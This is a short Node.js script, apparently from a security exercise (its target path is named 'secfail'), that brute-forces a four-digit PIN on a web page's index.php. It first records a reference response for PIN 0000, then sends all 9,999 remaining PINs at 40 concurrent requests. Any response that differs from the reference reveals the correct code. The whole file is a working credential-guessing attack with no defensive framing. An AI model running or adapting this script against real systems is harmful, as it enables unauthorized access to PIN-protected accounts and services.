#!/usr/bin/env node
'use strict';

console.log('Hello world !');

////////////////////////////////////////////////////////////

const fetch = require('node-fetch');
const async = require('async')

const ADDRESS = 'http://raphaelwa.ch/secfail'
//const ADDRESS = 'http://10.1.38.74'

////////////////////////////////////////////////////////////

let reference

fetch(ADDRESS + '/index.php?pincode=0000')
.then(res => {
	reference = res
	return res.text();
})
.then(text => {
	reference.text = text
	console.log(`reference response ${reference.ok} ${reference.status} ${reference.text.slice(0, 10)}...`)
})
.then(bruteForce)
.then(undefined, err => console.error(err)) // catch all

function bruteForce() {
	const MAX = 10000
	const pins = []
	for(let i = 1; i < MAX; ++i) {
		const pin = ('0000' + String(i)).slice(-4)
		pins.push(pin)
	}

	async.mapLimit(pins, 40, (pin, callback) => {
		test(pin, callback)
	}, (err, results) => {
		if (err)
			console.error(err)
		else
			console.log('all done')
	});
}

let progress = 0
function test(pin, callback) {
	return fetch(ADDRESS + '/index.php?pincode=' + pin)
	.then(res => {
		progress++
		if (progress % 1000 === 0) console.log(progress)
		
		if (res.ok !== reference.ok || res.status !== reference.status)
			throw new Error('!A' + pin + '!')
		return res.text()
	})
	.then(text => {
		if (text !== reference.text)
			throw new Error('!B' + pin + '!')
	})
	.then(
		res => callback(null, pin),
		err => callback(err)
	);
}
